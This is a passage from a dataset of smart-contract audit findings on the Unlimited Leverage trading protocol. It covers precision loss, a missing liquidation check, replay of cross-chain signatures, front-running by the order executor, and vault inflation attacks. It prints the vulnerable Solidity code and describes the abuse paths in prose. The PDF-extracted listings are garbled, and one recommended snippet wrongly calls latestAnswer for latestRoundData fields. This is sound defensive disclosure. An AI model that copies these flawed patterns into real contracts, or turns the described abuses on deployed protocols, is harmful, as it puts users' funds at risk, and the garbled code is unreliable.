short position , the volume delta is used , to \" buy  \" the change of size ( and give it back ) 446 int256 priceOfSizeDelta = currentPrice * int256 ( delta .  assetAmount ) / int256 (10 ** self . assetDecimals ); //  priceOfAssetAmountDelta 447 int256 realizedPnL = ( priceOfSizeDelta - int256 ( delta . volume ))  * self . _shortMultiplier () ; 448 449 450 451 452 453 454 455 456 457 458 } int256 payout = int256 ( delta . margin ) + realizedPnL ; // change storage values self . margin -= delta . margin ; self . volume -= delta . volume ; self . assetAmount -= delta . assetAmount ; // Return payout for further calculations return payout ; In the line 438 of the PositionMaths library, the following operation is performed: delta.margin = self._lastNetMargin()*closeProportion/PERCENTAGE_MULTIPLIER In that division, some precision is lost and the delta.margin value is then subtracted from the storage: self.margin -= delta.margin. This precision loss here will cause 2 different problems. 19 PROBLEM #1: The last user in the system will never be able to close his position as the TradePair contract will not have enough balance to pay the maker: Listing 2: TradePair.sol (Lines 279,283,285) Position storage position = positions [ positionId_ ]; 259 function _closePosition ( uint256 positionId_ ) private { 260 261 262 263 // Clear Buffer ( uint256 remainingMargin , uint256 remainingBufferFee , uint256  requestLoss ) = _clearBuffer ( position , false ); 264 265 266 267 268 269 // Get the payout to the maker uint256 payoutToMaker = _getPayoutToMaker ( position ); // update aggregated values positionStats . removeTotalCount ( position . margin , position .  volume , position . assetAmount , position . isShort ); 270 271 int256 protocolPnL = int256 ( remainingMargin ) - int256 (  payoutToMaker ) - int256 ( requestLoss ); 272 273 274 275 276 277 278 // fee manager receives the remaining fees _depositBorrowFees ( remainingBufferFee ); uint256 payout = _registerProtocolPnL ( protocolPnL ); // Make sure the payout to maker does not exceed the  collateral for this position made up of the remaining margin and  the ( possible ) received loss payout 20 279 emit Debug ( payoutToMaker , payout , remainingMargin , collateral .  balanceOf ( address ( this )) ); 280 281 282 283 if ( payoutToMaker > payout + remainingMargin ) { payoutToMaker = payout + remainingMargin ; } emit Debug ( payoutToMaker , payout , remainingMargin , collateral .  balanceOf ( address ( this )) ); 284 285 if ( payoutToMaker > 0) { _payoutToMaker ( position . owner , int256 ( payoutToMaker ) ,  positionId_ ); } 286 287 288 emit RealizedPnL ( position . owner , positionId_ ,  _getCurrentNetPnL ( position )) ; 289 290 emit ClosedPosition ( positionId_ , _getCurrentPrice ( position .  isShort , true )); 291 292 293 294 } // Finally delete position _deletePosition ( positionId_ ); PROBLEM #2: when _registerProtocolPnL() is called the At a position closure, TradePair smart contract will not have enough balance to transfer protocolPnL_ to the LiquidityPoolAdapter: 21 Listing 3: TradePair.sol (Line 724) 716 /* * 717 718 719 720 721 function _registerProtocolPnL ( int256 protocolPnL_ ) internal * @notice Registers profit or loss at liquidity pool adapter * @param protocolPnL_ Profit or loss of protocol * @return payout Payout received from the liquidity pool adapter */  returns ( uint256 payout ) { 722 723 724 if ( protocolPnL_ > 0) { // Profit collateral . safeTransfer ( address ( liquidityPoolAdapter ) ,  uint256 ( protocolPnL_ )) ; 725 726 727 728 liquidityPoolAdapter . depositProfit ( uint256 ( protocolPnL_ )); } else if ( protocolPnL_ < 0) { // Loss payout = liquidityPoolAdapter . requestLossPayout ( uint256 (-  protocolPnL_ )); 729 730 731 } } // if PnL == 0, nothing happens Risk Level: Likelihood - 5 Impact - 3 Recommendation: It is recommended to use mulDiv() from the Uniswaps FullMath library in all the divisions to avoid the precision loss. References: Uniswap V3s docs Mathematical explanation 22 Remediation Plan: SOLVED: The Unlimited Network team solved the issue in the following commit ID. Commit ID : ae36e3ddea25900d66245c82f88aaafc92266c05. During the second review, it has been observed that this change was committed on PR #121 and merged into the master branch. 23 ", "labels": ["Halborn", "Unlimited_Network_Unlimited_Leverage", "Severity: High"]}, {"title": "OPENPOSITIONVIASIGNATURE DOES NOT CHECK THAT THE POSITION IS NOT LIQUIDATABLE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Unlimited_Network_Unlimited_Leverage_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In the TradeManagerOrders contract, the function openPositionViaSignature () is used to an open a new position in Unlimited Leverage. This function As this is missing the _verifyPositionsValidity(positionId_); check. check is missing, users may open liquidatable positions directly. Under a wrong configuration or a high liquidation fee, this could be abused to drain all the liquidity from the liquidity pools by creating tiny liquidatable positions and then liquidating them to get the liquidation fee. Code Location: Listing 4: TradeManagerOrders.sol (Line 49) * @notice Opens a position with a signature * @param order_ Order struct * @param maker_ address of the maker * @param signature_ signature of order_ by maker_ */ 29 /* * 30 31 32 33 34 35 function openPositionViaSignature ( 36 37 38 39 40 ) external onlyOrderExecutor onlyActiveTradePair ( order_ . params .  tradePair ) returns ( uint256 ) { 41 42 43 OpenPositionOrder calldata order_ , UpdateData [] calldata updateData_ , address maker_ , bytes calldata signature_ _updateContracts ( updateData_ ); _processSignature ( order_ , maker_ , signature_ ); _verifyConstraints ( 24 order_ . params . tradePair , order_ . constraints , order_ . params _transferOrderReward ( order_ . params . tradePair , maker_ , msg . uint256 positionId = _openPosition ( order_ . params , maker_ ); sigHashToTradeId [ keccak256 ( signature_ )] = TradeId ( order_ . ); 44  . isShort ? UsePrice . MAX : UsePrice . MIN 45 46 47  sender ); 48 49 50 51  params . tradePair , uint96 ( positionId )); 52 53  positionId , signature_ ); 54 55 56 } return positionId ; emit OpenedPositionViaSignature ( order_ . params . tradePair , Listing 5: TradeManager.sol (Lines 59-61) ITradePair ( params_ . tradePair ). collateral () . safeTransferFrom ( * @notice Opens a position for a trading pair . * @param params_ The parameters for opening a position . * @param maker_ Maker of the position */ 49 /* * 50 51 52 53 54 function _openPosition ( OpenPositionParams memory params_ , address  maker_ ) internal returns ( uint256 ) { 55  maker_ , address ( params_ . tradePair ) , params_ . margin ); 56 57 58 59 60  params_ . whitelabelAddress 61 62 63 64 65 66 } uint256 id = ITradePair ( params_ . tradePair ). openPosition ( userManager . setUserReferrer ( maker_ , params_ . referrer ); emit PositionOpened ( params_ . tradePair , id ); maker_ , params_ . margin , params_ . leverage , params_ . isShort , return id ; ); 25 Listing 6: TradePair.sol (Line 189) 170 /* * 171 172 173 174 * @notice opens a position * @param maker_ owner of the position * @param margin_ the amount of collateral used as a margin * @param leverage_ the target leverage , should respect  LEVERAGE_MULTIPLIER * @param isShort_ bool if the position is a short position */ 175 176 177 function openPosition ( address maker_ , uint256 margin_ , uint256  leverage_ , bool isShort_ , address whitelabelAddress ) if ( whitelabelAddress != address (0) ) { external verifyLeverage ( leverage_ ) onlyTradeManager syncFeesBefore checkAssetAmountLimitAfter returns ( uint256 ) 178 179 180 181 182 183 184 { 185 186 187 188 189 190 } 191 192 /* * 193 194 195 function _openPosition ( address maker_ , uint256 margin_ , uint256 * @dev Should have received margin from TradeManager */ return _openPosition ( maker_ , margin_ , leverage_ , isShort_ ); positionIdToWhiteLabel [ nextId ] = whitelabelAddress ; }  leverage_ , bool isShort_ ) 196 197 198 { 199 private returns ( uint256 ) require ( margin_ >= minMargin , \" TradePair :: _openPosition :  margin must be above or equal min margin \"); 200 201 202 203 204 uint256 id = nextId ; nextId ++; margin_ = _deductAndTransferOpenFee ( maker_ , margin_ , leverage_  , id ); 205 206 207 uint256 volume = ( margin_ * leverage_ ) / LEVERAGE_MULTIPLIER ; require ( volume <= volumeLimit , \" TradePair :: _openPosition : 26  borrow limit reached \"); 208 209 210 211 212  ); 213 214  ); 215 216 217 _registerUserVolume ( maker_ , volume ); uint256 assetAmount ; if ( isShort_ ) { assetAmount = priceFeedAdapter . collateralToAssetMax ( volume } else { assetAmount = priceFeedAdapter . collateralToAssetMin ( volume } ( int256 currentBorrowFeeIntegral , int256  currentFundingFeeIntegral ) = _getCurrentFeeIntegrals ( isShort_ ); 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 positions [ id ] = Position ({ margin : margin_ , volume : volume , assetAmount : assetAmount , pastBorrowFeeIntegral : currentBorrowFeeIntegral , lastBorrowFeeAmount : 0, pastFundingFeeIntegral : currentFundingFeeIntegral , lastFundingFeeAmount : 0, lastFeeCalculationAt : uint48 ( block . timestamp ) , openedAt : uint48 ( block . timestamp ) , isShort : isShort_ , owner : maker_ , assetDecimals : uint16 ( assetDecimals ) , lastAlterationBlock : uint40 ( block . number ) }) ; userToPositionIds [ maker_ ]. push ( id ); positionStats . addTotalCount ( margin_ , volume , assetAmount ,  isShort_ ); 238 239 emit OpenedPosition ( maker_ , id , margin_ , volume , assetAmount ,  isShort_ ); 240 241 242 } return id ; 27 Proof of Concept: Risk Level: Likelihood - 2 Impact - 5 Recommendation: It is recommended to add the _verifyPositionsValidity(positionId_); check in the TradePair._openPosition() function. 28 Remediation Plan: SOLVED: The Unlimited Network team solved the issue in the following commit ID. Commit ID : ae36e3ddea25900d66245c82f88aaafc92266c05. During the second review, it has been observed that this change was committed on PR #121 and merged into the master branch. 29 ", "labels": ["Halborn", "Unlimited_Network_Unlimited_Leverage", "Severity: Medium"]}, {"title": "USE OF DEPRECATED CHAINLINK FUNCTION: LATESTANSWER", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Unlimited_Network_Unlimited_Leverage_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "According to Chainlinks documentation (API Reference), the latestAnswer function is deprecated. This function does not throw an error if no answer has been reached, but instead returns 0, possibly causing an incorrect price to be fed to the different price feeds or even a Denial of Service by a division by zero. Code Location: ChainlinkUsdPriceFeed.sol Listing 7: ChainlinkUsdPriceFeed.sol (Line 24) 23 function price () external view returns ( int256 ) { 24 25 } return chainlinkPriceFeed . latestAnswer () ; UnlimitedPriceFeed.sol Listing 8: UnlimitedPriceFeed.sol (Line 117) require ( updateData_ . length == DATA_LENGTH , \" UnlimitedPriceFeed PriceData memory newPriceData = abi . decode ( updateData_ [ 90 function update ( bytes calldata updateData_ ) external { 91  :: update : Bad data length \" ); 92 93  SIGNER_END :] , ( PriceData )) ; 94 95  data 96 97 98 if ( newPriceData . createdOn <= priceData . createdOn ) { return ; } // Verify new price data is more recent than the current price 30 99 100 101 // verify signer access controlls address signer = abi . decode ( updateData_ [ SIGNATURE_END :  SIGNER_END ], ( address )) ; 102 103 104 105 106 107 108 109 // throw if the signer is not allowed to update the price _verifySigner ( signer ); // verify signature bytes calldata signature = updateData_ [: SIGNATURE_END ]; require ( SignatureChecker . isValidSignatureNow ( signer ,  _hashPriceDataUpdate ( newPriceData ) , signature ) , 110 111 112 113 114 115 116 117 118 119 120 \" UnlimitedPriceFeed :: update : Bad signature \" ); // verify validity of data _verifyValidTo ( newPriceData . validTo ); // verify price deviation is not too high int256 chainlinkPrice = chainlinkPriceFeed . latestAnswer () ; unchecked { int256 maxAbsoluteDeviation = int256 ( uint256 (  chainlinkPrice ) * maxDeviation / FULL_PERCENT ); 121 122 123 require ( newPriceData . price >= chainlinkPrice -  maxAbsoluteDeviation 124 && newPriceData . price <= chainlinkPrice +  maxAbsoluteDeviation , 125 126 127 128 129 130 } \" UnlimitedPriceFeed :: update : Price deviation too high \" ); } priceData = newPriceData ; UnlimitedPriceFeedAdapter.sol In this contract a Denial of Service would occur if collateralChainlinkPriceFeed .latestAnswer() returned zero as a division by zero would occur in the _getChainlinkPrice() internal function. This would DoS any call to the UnlimitedPriceFeedAdapter.update() function. 31 Listing 9: UnlimitedPriceFeedAdapter.sol (Line 144) 143 function _assetToUsd ( uint256 assetAmount_ ) private view returns (  uint256 ) { 144 return assetAmount_ * uint256 ( assetChainlinkPriceFeed .  latestAnswer () ) / ASSET_MULTIPLIER ; 145 } Listing 10: UnlimitedPriceFeedAdapter.sol (Line 170) 169 function _collateralToUsd ( uint256 collateralAmount_ ) private view  returns ( uint256 ) { 170 return collateralAmount_ * uint256 (  collateralChainlinkPriceFeed . latestAnswer () ) /  COLLATERAL_MULTIPLIER ; 171 } Listing 11: UnlimitedPriceFeedAdapter.sol (Lines 222,223) 221 function _getChainlinkPrice () internal view returns ( int256 ) { 222 return assetChainlinkPriceFeed . latestAnswer () * int256 (  _priceMultiplier ) 223 224 } / collateralChainlinkPriceFeed . latestAnswer () ; Risk Level: Likelihood - 2 Impact - 5 Recommendation: It is recommended to use Chainlinks latestRoundData() function to get the price instead. It is also recommended to add checks on the return data with proper revert messages if the price is stale or the round is incomplete, for example: 32 Listing 12: latestRoundData example call 1 ( uint80 baseRoundID , int256 answer , , uint256 baseTimestamp ,  uint80 baseAnsweredInRound ) = assetChainlinkPriceFeed . latestAnswer  () ; 2 require ( answer > 0, \" ChainlinkPriceOracle : answer <= 0 \"); 3 require ( baseAnsweredInRound >= baseRoundID , \" ChainlinkPriceOracle :  Stale price \"); 4 require ( baseTimestamp > 0, \" ChainlinkPriceOracle : Round not  complete \" ); 5 uint256 _price = uint256 ( answer ); Remediation Plan: SOLVED: The Unlimited Network team solved the issue in the following commit ID. Commit ID : ae36e3ddea25900d66245c82f88aaafc92266c05. During the second review, it has been observed that this change was committed on PR #121 and merged into the master branch. 33 ", "labels": ["Halborn", "Unlimited_Network_Unlimited_Leverage", "Severity: Medium"]}, {"title": "UNLIMITEDPRICEFEED IS VULNERABLE TO CROSSCHAIN SIGNATURE REPLAY ATTACKS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Unlimited_Network_Unlimited_Leverage_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The UnlimitedPriceFeedUpdater smart contract contains the function update () which is used to update the price of the collateral with a valid signature: Listing 13: UnlimitedPriceFeedUpdater.sol (Lines 90-93) // Verify new price data is more recent than the current price * @notice Update price with signed data . * @param updateData_ Data bytes consisting of signature , signer , */ PriceData memory newPriceData = abi . decode ( updateData_ [ 67 /* * 68 69  and price data in respected order . 70 71 function update ( bytes calldata updateData_ ) external { 72 require ( updateData_ . length == DATA_LENGTH , \"  UnlimitedPriceFeedUpdater :: update : Bad data length \" ); 73 74  SIGNER_END :] , ( PriceData )) ; 75 76  data 77 78 79 80 81 82 83  SIGNER_END ], ( address )) ; 84 85 86 87 88 89 90 // Return if the new price data is not more recent if ( newPriceData . createdOn <= priceData . createdOn ) { // verify signature bytes calldata signature = updateData_ [: SIGNATURE_END ]; require ( // verify signer access controlls address signer = abi . decode ( updateData_ [ SIGNATURE_END : // throw if the signer is not allowed to update the price _verifySigner ( signer ); return ; } 34 \" UnlimitedPriceFeedUpdater :: update : Bad signature \" SignatureChecker . isValidSignatureNow ( signer , ); 91  _hashPriceDataUpdate ( newPriceData ) , signature ) , 92 93 94 95 96 97 98 99 100 101 } // verify validity of data _verifyValidTo ( newPriceData . validTo ); _verifyNewPrice ( newPriceData . price ); priceData = newPriceData ; The signature hash is built through the _hashPriceDataUpdate() function: Listing 14: UnlimitedPriceFeedUpdater.sol (Line 106) 105 function _hashPriceDataUpdate ( PriceData memory priceData_ )  internal view returns ( bytes32 ) { 106 107 } return keccak256 ( abi . encode ( address ( this ) , priceData_ )) ; The PriceData struct is also built as shown below: Listing 15: UnlimitedPriceFeedUpdater.sol * @notice Struct to store the price feed data . * @custom : member createdOn The timestamp when the price data was * @custom : member validTo The timestamp until which the price data 9 /* * 10 11  stored . 12  is valid . 13 14 15 struct PriceData { 16 17 18 19 } uint32 createdOn ; uint32 validTo ; int192 price ; * @custom : member price The price . */ This implementation: 35 Mitigates any risk of reusing an old signature, as the update() 1. function verifies that the new price data is more recent than the current price data. 2. Verifies that the data is valid through the _verifyValidTo() function. 3. Verifies that the price does not deviate too much by comparing the new price with the price of a Chainlink oracle. Although, this implementation does not use any type of Domain Separator, making it vulnerable to cross-chain replay attacks. This would be an issue under the following conditions: 1. Unlimited Leverage is deployed in multiple blockchains (i.e. Arbitrum & Polygon), under the same contract addresses. 2. The same signer is set in the Controller for both blockchains. 3. A malicious user would be able to use signatures crafted for Arbitrum in the Polygon contract and vice versa. Risk Level: Likelihood - 1 Impact - 5 Recommendation: It is recommended to use a Domain Separator when creating the PriceData signature. Remediation Plan: SOLVED: The Unlimited Network team solved the issue in the following commit ID. Commit ID : ae36e3ddea25900d66245c82f88aaafc92266c05. During the second review, it has been observed that this change was committed on PR #121 and merged into the master branch. 36 ", "labels": ["Halborn", "Unlimited_Network_Unlimited_Leverage", "Severity: Medium"]}, {"title": "CENTRALIZATION RISK: ORDEREXECUTOR COULD CLOSE POSITIONS IN HIS BENEFIT BEFORE EVERY PRICE UPDATE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Unlimited_Network_Unlimited_Leverage_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The Unlimited Leverage protocol will use the UnlimitedPriceFeedAdapter as a price feed. This price feed will be updated by an authorized signer through the UnlimitedPriceFeedUpdater.update() function: Listing 16: UnlimitedPriceFeedUpdater.sol (Lines 90-93) // Verify new price data is more recent than the current price */ * @notice Update price with signed data . * @param updateData_ Data bytes consisting of signature , signer PriceData memory newPriceData = abi . decode ( updateData_ [ 67 /* * 68 69  and price data in respected order . 70 71 function update ( bytes calldata updateData_ ) external { 72 require ( updateData_ . length == DATA_LENGTH , \"  UnlimitedPriceFeedUpdater :: update : Bad data length \" ); 73 74  SIGNER_END :] , ( PriceData )) ; 75 76  data 77 78 79 80 81 82 83  SIGNER_END ], ( address )) ; 84 85 86 87 88 // Return if the new price data is not more recent if ( newPriceData . createdOn <= priceData . createdOn ) { // verify signer access controlls address signer = abi . decode ( updateData_ [ SIGNATURE_END : // throw if the signer is not allowed to update the price _verifySigner ( signer ); // verify signature return ; } 37 \" UnlimitedPriceFeedUpdater :: update : Bad signature \" bytes calldata signature = updateData_ [: SIGNATURE_END ]; require ( SignatureChecker . isValidSignatureNow ( signer , ); 89 90 91  _hashPriceDataUpdate ( newPriceData ) , signature ) , 92 93 94 95 96 97 98 99 100 101 } // verify validity of data _verifyValidTo ( newPriceData . validTo ); _verifyNewPrice ( newPriceData . price ); priceData = newPriceData ; On the other hand, all the different orders will be performed by an account with the OrderExecutor role in the TradeManagerOrders contract. For example: Listing 17: TradeManagerOrders.sol (Lines 40,41) OpenPositionOrder calldata order_ , UpdateData [] calldata updateData_ , address maker_ , bytes calldata signature_ * @notice Opens a position with a signature * @param order_ Order struct * @param maker_ address of the maker * @param signature_ signature of order_ by maker_ */ 29 /* * 30 31 32 33 34 35 function openPositionViaSignature ( 36 37 38 39 40 ) external onlyOrderExecutor onlyActiveTradePair ( order_ . params .  tradePair ) returns ( uint256 ) { 41 42 43 44  . isShort ? UsePrice . MAX : UsePrice . MIN 45 46 47  sender ); _updateContracts ( updateData_ ); _processSignature ( order_ , maker_ , signature_ ); _verifyConstraints ( _transferOrderReward ( order_ . params . tradePair , maker_ , msg . ); order_ . params . tradePair , order_ . constraints , order_ . params 38 uint256 positionId = _openPosition ( order_ . params , maker_ ); sigHashToTradeId [ keccak256 ( signature_ )] = TradeId ( order_ . 48 49 50 51  params . tradePair , uint96 ( positionId )); 52 53  positionId , signature_ ); 54 55 56 } return positionId ; emit OpenedPositionViaSignature ( order_ . params . tradePair , As seen, _updateContracts(updateData_); is called: Listing 18: TradePair.sol (Line 367) 360 function _updateContracts ( UpdateData [] calldata updateData_ )  internal { 361 362 363 for ( uint256 i ; i < updateData_ . length ; i ++) { require ( controller . isUpdatable ( updateData_ [i ].  updatableContract ) , 364 \" TradeManager :: _updateContracts : Contract not  updatable \" ); 365 366 367 IUpdatable ( updateData_ [ i ]. updatableContract ). update (  updateData_ [ i ]. data ); 368 369 } } If this is given a valid signature, the UnlimitedPriceFeed will be updated with a new price and then the orders will be processed. Based on this implementation, Unlimited Leverage could be abused by the OrderExecutor account in the following way: 1. OrderExecutor opens multiple long/short positions. 2. Every time the OrderExecutor gets some UpdateData, the OrderExecutor checks the new price: - If the new price is higher, OrderExecutor closes all his short positions by calling closePositionViaSignature() with an empty updateData_ and then 39 submits a new transaction with the updateData_ that updates the price accordingly. - If the new price is lower, OrderExecutor closes all his long positions by calling closePositionViaSignature() with an empty updateData_ and then submits a new transaction with the updateData_ that updates the price accordingly. This way, the OrderExecutor is front-running every price update, and he will always profit, reducing the income of the LPs in his benefit. Risk Level: Likelihood - 1 Impact - 5 Recommendation: There is no valid recommendation for this issue, as it would require a total re-design of the project. Remediation Plan: RISK ACCEPTED: This issue has not been addressed in the latest Commit ID: ae36e3ddea25900d66245c82f88aaafc92266c05 40 ", "labels": ["Halborn", "Unlimited_Network_Unlimited_Leverage", "Severity: Medium"]}, {"title": "FIRST LIQUIDITYPOOL DEPOSITOR COULD BE FRONT", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Unlimited_Network_Unlimited_Leverage_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The LiquidityPool contract follows the EIP4626 standard: https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/ contracts/token/ERC20/extensions/ERC4626.sol This extension allows the minting and burning of shares (represented using the ERC20 inheritance) in exchange for underlying assets through standardized deposit, mint, redeem and burn workflows. But this extension also has the following problem: When the vault is empty or nearly empty, deposits are at high risk of being stolen through front-running with a donation to the vault that inflates the price of a share. This is variously known as a donation or inflation attack and is essentially a problem of slippage. Vault deployers can protect against this attack by making an initial deposit of a non-trivial amount of the asset, such that price manipulation becomes infeasible. Withdrawals may similarly be affected by slippage. In order to prevent this, the LiquidityPool contract has 2 different mechanisms:  In the deposit() function, a minShares_ parameter is used. If the final shares that will be given to the user are less than minShares_ the call would revert. As long as the users use correctly the minShares_ parameter, they will be protected against a first deposit front-run. Listing 19: LiquidityPool.sol (Line 236) 229 /* * 230 231 232 * @notice Deposits an amount of the collateral asset . * @param assets_ The amount of the collateral asset to deposit . * @param minShares_ The desired minimum amount to receive in 41  exchange for the deposited collateral . Reverts otherwise . 233 * @return The amount of shares received for the deposited  collateral . */ 234 235 function deposit ( uint256 assets_ , uint256 minShares_ ) external  updateUser ( msg . sender ) returns ( uint256 ) { 236 237 } return _depositAsset ( assets_ , minShares_ , msg . sender ); Listing 20: LiquidityPool.sol (Line 276) 270 /* * 271 272 273 function _depositAsset ( uint256 assets_ , uint256 minShares_ , * @dev deposits assets into the pool */  address receiver_ ) private returns ( uint256 ) { 274 275 276 uint256 shares = previewDeposit ( assets_ ); require ( shares >= minShares_ , \" LiquidityPool :: _depositAsset :  Bad slippage \"); 277 278 279 280 281 } _deposit ( msg . sender , receiver_ , assets_ , shares ); return shares ;  On the other hand, the LiquidityPoolVault uses a 24 decimal precision for the shares minted/burnt, while the most ERC20 tokens use an 18 decimals precision. This means that the initial deposit will be given 1000000 shares per asset (in case that the asset has 18 decimals): (asset * 10e24)/ 10e18 Listing 21: LiquidityPoolVault.sol (Line 23) 23 uint8 internal constant _decimals = 24; Listing 22: LiquidityPoolVault.sol (Lines 103,104) 95 /* * 96 * @dev Internal convertion function ( from assets to shares ) with 42 * * Will revert if assets > 0, totalSupply > 0 and totalAssets = 0.  support for rounding direction 97 98  That corresponds to a case where any asset 99 100 101 function _convertToShares ( uint256 assets , Math . Rounding rounding ) * would represent an infinite amout of shares . */  internal view virtual returns ( uint256 shares ) { 102 103 104 uint256 supply = totalSupply () ; return ( assets == 0 || supply == 0) ? assets . mulDiv (10 ** decimals () , 10 ** _asset . decimals () ,  rounding ) 105 106 } : assets . mulDiv ( supply , totalAssets () , rounding ); Although, there are some tokens that have more than 18 decimals. example, YamV2. For The LiquidityPool contract does not prevent anywhere in the code that the token used as the collateral contains more than 18 decimals: Listing 23: LiquidityPoolVault.sol (Lines 28-30) using Math for uint256 ; uint8 internal constant _decimals = 24; IERC20Metadata internal immutable _asset ; 18 abstract contract LiquidityPoolVault is ERC20Upgradeable ,  ILiquidityPoolVault { 19 20 21 22 23 24 25 26  ERC20 - compatible contract ( ERC20 or ERC777 ) . 27 28 29 30 constructor ( IERC20Metadata asset_ ) { _asset = asset_ ; /* * */ } * @dev Set the underlying asset contract . This must be an 43 Proof of Concept: In the case that a token with for example 24 decimals is used and that the initial depositor does not properly make use of the deposit().minShares_ parameter, this inflation attack would be possible: 44 Risk Level: Likelihood - 1 Impact - 4 Recommendation: It is recommended to ensure that no token with more than 18 decimals can be used as collateral in the LiquidityPool contract. For example: Listing 24: LiquidityPoolVault.sol (Line 29) using Math for uint256 ; uint8 internal constant _decimals = 24; IERC20Metadata internal immutable _asset ; 18 abstract contract LiquidityPoolVault is ERC20Upgradeable ,  ILiquidityPoolVault { 19 20 21 22 23 24 25 26  ERC20 - compatible contract ( ERC20 or ERC777 ) . 27 28 29  be <= 18 \"); 30 31 constructor ( IERC20Metadata asset_ ) { _asset = asset_ ; /* * */ } * @dev Set the underlying asset contract . This must be an require ( asset_ . decimals () <= 18 , \" Collateral decimals must Remediation Plan: SOLVED: The Unlimited Network team solved the issue in the following commit ID. Commit ID : ae36e3ddea25900d66245c82f88aaafc92266c05. 45 ", "labels": ["Halborn", "Unlimited_Network_Unlimited_Leverage", "Severity: Low"]}, {"title": "MULTIPLE FUNCTIONS DO NOT CHECK THAT THE NEW MARGIN IS HIGHER THAN THE MINIMUM MARGIN", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Unlimited_Network_Unlimited_Leverage_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In the TradeManagerOrders contract, the function removeMarginFromPositionViaSignature () is used to remove some margin from an existing position in Unlimited This function is missing the verifyLeverage(positionId_); Leverage. modifier. As this modifier is missing, the new margin may be less than the minimum margin permitted by the protocol. The same issue is also present in the functions: - partiallyClosePositionViaSignature() - extendPositionViaSignature() - extendPositionToLeverageViaSignature() Code Location: Listing 25: TradePair.sol (Line 481) 467 /* * 468 469 470 471 472 473 function removeMarginFromPosition ( address maker_ , uint256 * @notice Removes margin from a position * @param maker_ owner of the position * @param positionId_ id of the position * @param removedMargin_ the margin to be removed */  positionId_ , uint256 removedMargin_ ) 474 475 476 477 478 479 480 { external onlyTradeManager verifyOwner ( maker_ , positionId_ ) syncFeesBefore updatePositionFees ( positionId_ ) onlyValidAlteration ( positionId_ ) 46 481 _removeMarginFromPosition ( maker_ , positionId_ , removedMargin_ )  ; 482 } 483 484 function _removeMarginFromPosition ( address maker_ , uint256  positionId_ , uint256 removedMargin_ ) private { 485 486 487 488 489 490 491 Position storage position = positions [ positionId_ ]; // update position in storage position . removeMargin ( removedMargin_ ); // update aggregated values positionStats . removeTotalCount ( removedMargin_ , 0 , 0 , position .  isShort ); 492 493 494 495 496 497 498 499 500 501 502 } _payoutToMaker ( maker_ , int256 ( removedMargin_ ) , positionId_ ); emit AlteredPosition ( PositionAlterationType . removeMargin , positionId_ , position . lastNetMargin () , position . volume , position . assetAmount ); 47 Proof of Concept: Risk Level: Likelihood - 2 Impact - 3 Recommendation: It is recommended to add the verifyLeverage(positionId_); modifier to the functions: - TradePair.removeMarginFromPosition() - TradePair.partiallyClosePositionViaSignature() - TradePair.extendPositionViaSignature() - TradePair.extendPositionToLeverageViaSignature() 48 Remediation Plan: SOLVED: The Unlimited Network team solved the issue in the following commit ID. Commit ID : ae36e3ddea25900d66245c82f88aaafc92266c05. Users are allowed to have a margin under the minimum margin, as long as they do not achieve that by removing margin. 49 ", "labels": ["Halborn", "Unlimited_Network_Unlimited_Leverage", "Severity: Low"]}, {"title": "ADDING MARGIN TO A POSITION MAY RESULT IN A NEGATIVE LIQUIDATION PRICE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Unlimited_Network_Unlimited_Leverage_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "When adding margin into a position, it is not checked that the new leverage obtained is higher than the minimum leverage allowed: Listing 26: TradePair.sol 506 /* * 507 508 509 510 511 512 function addMarginToPosition ( address maker_ , uint256 positionId_ , * @notice Adds margin to a position * @param maker_ owner of the position * @param positionId_ id of the position * @param addedMargin_ the margin to be added */  uint256 addedMargin_ ) external onlyTradeManager verifyOwner ( maker_ , positionId_ ) syncFeesBefore updatePositionFees ( positionId_ ) onlyValidAlteration ( positionId_ ) 513 514 515 516 517 518 519 { 520 521 } 522 523 /* * 524 525 526 function _addMarginToPosition ( address maker_ , uint256 positionId_ , * @dev Should have received margin from TradeManager */ _addMarginToPosition ( maker_ , positionId_ , addedMargin_ );  uint256 addedMargin_ ) private { 527 528 529 Position storage position = positions [ positionId_ ]; addedMargin_ = _deductAndTransferOpenFee ( maker_ , addedMargin_ ,  LEVERAGE_MULTIPLIER , positionId_ ); 530 531 532 // change position in storage position . addMargin ( addedMargin_ ); 50 533 534 // update aggregated values positionStats . addTotalCount ( addedMargin_ , 0, 0, position .  isShort ); 535 536 537 538 539 540 541 542 543 } emit AlteredPosition ( PositionAlterationType . addMargin , positionId_ , position . lastNetMargin () , position . volume , position . assetAmount ); This causes that when a leverage lower than the minimum leverage is reached, the liquidation price will be negative: This does not have a direct impact on the protocol, as this value is only used in the frontend. Risk Level: Likelihood - 4 51 Impact - 1 Recommendation: It is recommended to return a liquidation price of 0 in the PositionMaths ._liquidationPrice() function in the case that the liquidation price is negative. Remediation Plan: SOLVED: The Unlimited Network team solved the issue in the following commit ID. Commit ID : ae36e3ddea25900d66245c82f88aaafc92266c05. During the second review, it has been observed that this change was committed on PR #121 and merged into the master branch. 52 ", "labels": ["Halborn", "Unlimited_Network_Unlimited_Leverage", "Severity: Low"]}, {"title": "LACK OF A DOUBLE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Unlimited_Network_Unlimited_Leverage_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The current ownership transfer process for all the contracts inheriting from Ownable or OwnableUpgradeable involves the current owner calling the transferOwnership() function: Listing 27: Ownable.sol 97 function transferOwnership ( address newOwner ) public virtual  onlyOwner { 98  zero address \"); 99 100 } require ( newOwner != 